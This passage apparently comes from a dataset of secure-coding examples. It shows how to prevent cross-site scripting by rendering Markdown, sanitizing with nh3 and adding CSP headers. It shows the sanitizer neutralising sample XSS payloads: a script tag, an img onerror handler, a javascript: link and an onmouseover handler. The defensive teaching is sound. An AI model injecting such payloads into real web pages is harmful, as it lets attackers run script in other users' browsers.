{% endfor %}
```

### Better: Use Markdown instead of raw HTML

```python
import markdown
import nh3

def render_user_content(raw_text: str) -> str:
    """Convert Markdown to HTML, then sanitize as defense in depth."""
    # Markdown converts **bold** → <strong>bold</strong>
    html = markdown.markdown(raw_text, extensions=['fenced_code'])
    # Sanitize removes anything Markdown didn't generate
    return nh3.clean(html, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRIBUTES)
```

Users write `**bold**` and `[link](https://example.com)` -- no raw HTML needed.

### What the sanitizer does to attacks

```python
sanitize_html('<script>alert("xss")</script>')
# → 'alert("xss")'  (script tags stripped, text preserved)

sanitize_html('<img src=x onerror=alert(1)>')
# → ''  (img not in allowed tags, removed entirely)

sanitize_html('<a href="javascript:alert(1)">click</a>')
# → '<a>click</a>'  (javascript: scheme blocked, href removed)

sanitize_html('<div onmouseover="alert(1)">hover me</div>')
# → 'hover me'  (div not allowed, event handler stripped)
```

### Additional headers for defense in depth

```python
@app.after_request
def security_headers(response):
    response.headers['Content-Security-Policy'] = "script-src 'self'"  # Block inline scripts
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response
```

CSP `script-src 'self'` blocks inline `<script>` tags even if sanitization is bypassed.'''
    ),
]
